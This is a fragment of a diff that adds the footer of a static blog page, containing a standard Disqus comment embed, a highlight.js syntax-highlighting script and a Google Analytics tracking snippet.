+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="http://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+</body>
+</html>
+
